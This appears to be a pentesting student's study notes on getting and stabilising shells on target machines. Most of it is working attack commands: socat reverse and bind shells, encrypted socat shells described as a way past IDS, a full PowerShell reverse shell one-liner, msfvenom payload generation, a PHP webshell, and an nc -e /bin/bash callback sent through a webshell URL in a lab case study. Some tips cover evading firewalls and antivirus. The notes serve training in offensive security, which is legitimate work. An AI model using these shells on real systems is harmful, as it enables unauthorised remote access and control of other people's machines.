
#### Shells:

If we get a shell on the target, our next goal should be to escalate our privileges such that we have a more reliable way of connecting to the target. This could be a "better" shell, or ideally a normal user on the target systems such that we can get a native shell. 


**Reverse:** Target connect back to us 
- Note when we connect via a reverse shell over the internet we need to configure our network to accept the shell. 
- Hot tips: Have the listening port be a common one such as 80, 443, 53 etc. since this makes the connection less likely to get stopped by firewalls. 


**Bind:** A port is open on the target, and we can connect to the target via it.
- Note firewalls on the target may stop the bind port

Resources to gain shells:
- Netcat / socat 
- Metasploit --multi/handler
- Msfvenom
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- /usr/share/webshells in kali 

**Interactive vs non-interactive shells:**
- Interactive shells lets us interact with programs after executing them, ex. SSH requering us to verify the fingerprint.
- Non-interactive shells restrict us to the programs that do not require interactions to run properly. 

**Make shells stabile:**
- Common problem that our (bind/reverse)shells do not have autocomplete, interactivity and loses connection when we type CTRL+C.  


- can use rlwrap with netcat: 
```
rlwrap nc -lvnp <port>
```

#### Socat:
**Reverse shell:**
```
Listening: socat TCP-L:<port> -
On target:

(Windows): socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

(Linux): socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

**Bind shell:**
```
On target listening:  
socat TCP-L:<PORT> EXEC:"bash -li"
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

On host connecting to target:
socat TCP:<TARGET-IP>:<TARGET-PORT> -

```


#### Encrypted shells:
- Usefull since it hides the communication between us and the target, can help with bypassing IDS. 
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

cat shell.key shell.crt > shell.pem

Then we can get the encrypted reverse shell listener:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -


Connecting back from the target:
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

Encrypted tty listening: (tty just make the shell more stabil)
```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

Corresponding code for the target to connect back to the listener
```
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```


#### Other shellcodes
For windows targets, insane reverse shell code:
``` PowerShell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

More on shells: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/


**Staged**  payloads are sent in two parts. The first part is called the _stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.  

**Stageless** payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

##### msfvenom 
ref: [[Metasploit]]

```
Full example:
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443 


General format of payloads: <OS>/<arch>/<payload>
ex: linux/x86/shell_reverse_tcp

Staged: linux/x86/meterpreter/reverse_tcp
Stageless: linux/x86/meterpreter_reverse_tcp

Seach for payloads:
msfvenom --list payloads | grep <filter for os, arch etc.>
```


#### Case problem:

- We are given a webserver vulnerable to file inclusion. 
- We start off by uploading a light php webshell:
```PHP
`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
```

Then we can execute commands via the url:
```
http://10.10.222.18/uploads/webshell.php?cmd=ifconfig
```

- NOTICE we have to navigate to the webshell.php then send in a command. 

Okey, this is nice, but we want a better shell, since this just runs in the browser. -> We can make the shell do a nc connection to our local listener, but this is still a unstable shell:
```
http://10.10.222.18/uploads/webshell.php?cmd=nc%2010.10.210.222%204444%20-e%20%2Fbin%2Fbash
```

We upload a better shell and execure it via the webshell:
- We upload a php reverse shell: `/usr/share/webshells/php/php-reverse-shell.php`

Then maybe we managed to get some credential files, and manage to ssh into the machine. 